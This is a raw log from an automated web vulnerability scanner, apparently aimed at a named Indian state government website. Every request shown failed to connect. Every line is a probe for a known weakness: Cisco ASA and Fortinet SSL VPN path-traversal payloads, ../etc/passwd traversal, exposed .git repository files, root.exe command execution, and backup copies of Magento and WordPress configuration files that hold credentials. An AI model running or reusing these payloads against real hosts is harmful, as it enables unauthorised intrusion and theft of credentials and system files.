
[21-03-12 09:55:43] - http://skill.dheodisha.gov.in/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:43] - http://skill.dheodisha.gov.in/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/hooks/applypatch-msg - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/hooks/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/FETCH_HEAD - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/hooks/post-update - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/config - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/description - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/head - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/COMMIT_EDITMSG - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/hooks/commit-msg - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:47] - http://skill.dheodisha.gov.in/ - .git/branches/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/HEAD - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/hooks/pre-applypatch - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/hooks/update - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/info/attributes - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/info/refs - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/hooks/prepare-commit-msg - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/hooks/pre-commit - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/refs/heads - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/refs/remotes/origin/master - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/head - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/hooks/pre-receive - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/hooks/pre-push - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/info/exclude - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/index - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/hooks/pre-rebase - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/refs - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/HEAD - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/refs/remotes/origin/HEAD - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/info/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/refs/heads/master - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/refs/remotes/origin - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/logs/refs/remotes - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:48] - http://skill.dheodisha.gov.in/ - .git/objects/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/remotes/origin - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/remotes/origin/HEAD - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/heads/master - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/remotes/origin/master - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/packed-refs - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/tags - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/remotes - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/refs/heads - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:55:58] - http://skill.dheodisha.gov.in/ - .git/objects/info/packs - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:00] - http://skill.dheodisha.gov.in/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:00] - http://skill.dheodisha.gov.in/ - _vti_bin/_vti_aut/fp30reg.dll - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:00] - http://skill.dheodisha.gov.in/ - _vti_bin/_vti_aut/fp30reg.dll?1234=X - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.phpunit - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.localRemote - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.live - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.template - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.vmachine - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.bak - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.additional - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:06] - http://skill.dheodisha.gov.in/ - app/etc/local.xml.vmachine.rm - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:11] - http://skill.dheodisha.gov.in/ - etc/passwd - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:11] - http://skill.dheodisha.gov.in/ - etc/hosts - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:16] - http://skill.dheodisha.gov.in/ - msdac/root.exe?/c+dir - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:20] - http://skill.dheodisha.gov.in/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:20] - http://skill.dheodisha.gov.in/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:20] - http://skill.dheodisha.gov.in/ - scripts/root.exe?/c+dir - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:21] - http://skill.dheodisha.gov.in/ - servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:21] - http://skill.dheodisha.gov.in/ - servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:21] - http://skill.dheodisha.gov.in/ - servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:21] - http://skill.dheodisha.gov.in/ - servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:22] - http://skill.dheodisha.gov.in/ - soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:25] - http://skill.dheodisha.gov.in/ - testproxy.php - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:25] - http://skill.dheodisha.gov.in/ - text-base/etc/passwd - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.inc - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.txt - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.save - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.dist - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.old - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.zip - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.bak - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:27] - http://skill.dheodisha.gov.in/ - wp-config.php.swp - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:28] - http://skill.dheodisha.gov.in/ - wp-content/uploads/ithemes-security/backups/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:28] - http://skill.dheodisha.gov.in/ - wp-json/wp/v2/users/ - Cannot connect to: skill.dheodisha.gov.in:80
[21-03-12 09:56:30] - http://skill.dheodisha.gov.in/ - xsql/lib/XSQLConfig.xml - Cannot connect to: skill.dheodisha.gov.in:80